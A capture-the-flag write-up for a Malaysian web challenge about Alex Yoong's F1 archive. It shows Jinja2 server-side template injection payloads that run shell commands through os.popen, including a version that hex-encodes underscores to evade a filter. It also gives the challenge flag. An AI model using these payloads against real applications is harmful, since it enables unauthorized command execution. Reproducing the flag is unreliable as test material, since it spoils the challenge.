# Pelumba Negara

> Arkib digital ini telah dibangunkan untuk pemandu F1 pertama Malaysia. Walau bagaimanapun, sistem ini ada kelemahan dan dapatkah anda untuk mengumpul semua serpihan maklumat bersejarah yang disembunyikan?

## Solution

Initial analysis of the website revealed a text input field. My first attempts at finding a vulnerability were unsuccessful:

- XSS (Cross-Site Scripting): The input was reflected, but no exploitable sink was found.
- SQLi (SQL Injection): There was no indication that the application queried a database.

Next, I tested for SSTI (Server-Side Template Injection) by submitting a basic template expression, `{{7*7}}`. The application returned 49, confirming the vulnerability. This suggests the application uses a templating engine like Jinja2.

<img width="1032" height="601" alt="image" src="https://github.com/user-attachments/assets/2cc50acc-2020-465a-a155-e4a05cf74e77" />

The goal now was to achieve Arbitrary Command Execution by crafting a payload that could read files on the server. I used this link as reference https://onsecurity.io/article/server-side-template-injection-with-jinja2/

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

<img width="598" height="452" alt="image" src="https://github.com/user-attachments/assets/b8df5122-765b-4703-8c1f-4347f97803de" />

However, this payload was blocked. The server likely had a filter to prevent the use of certain characters, such as the underscore (_).

To bypass this filter, I encoded the forbidden underscore character (_) using its hexadecimal representation.

```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

<img width="601" height="476" alt="image" src="https://github.com/user-attachments/assets/1ff86c25-dca1-461a-b010-4f652fb554c6" />


<img width="675" height="510" alt="image" src="https://github.com/user-attachments/assets/a29ac89b-86da-4c38-8e91-394164441a81" />

The webpage then displayed a hidden section containing a Base64 encoded string and a message about a "fake flag." This was a hint that the actual flag was still hidden. The message also suggested looking for hidden files, which typically start with a dot (.).

I used the ls -la command to list all files, including hidden ones. The command revealed a hidden `.env` file .

Reading the contents of the .env file revealed a list of file paths that could contain a flag .

```
# Alex Yoong F1 Career Configuration
# Malaysia's First Formula 1 Driver Database

# F1 Career Files
F1_DEBUT_YEAR_FILE=/usr/1976.txt
MALAYSIAN_DRIVER_DATA=/var/malaysia.txt
SEPANG_CIRCUIT_INFO=/tmp/f1.txt
```
I used the cat command to check each of these files, and the flag was found in one of them.

## Flag
```
3108{d4r1_Ku4l4_Lumpur_k3_p3nt4s_duni4_Alex_Y00ng_f1rst_M4l4ysi4n_F1_dr1v3r}
```
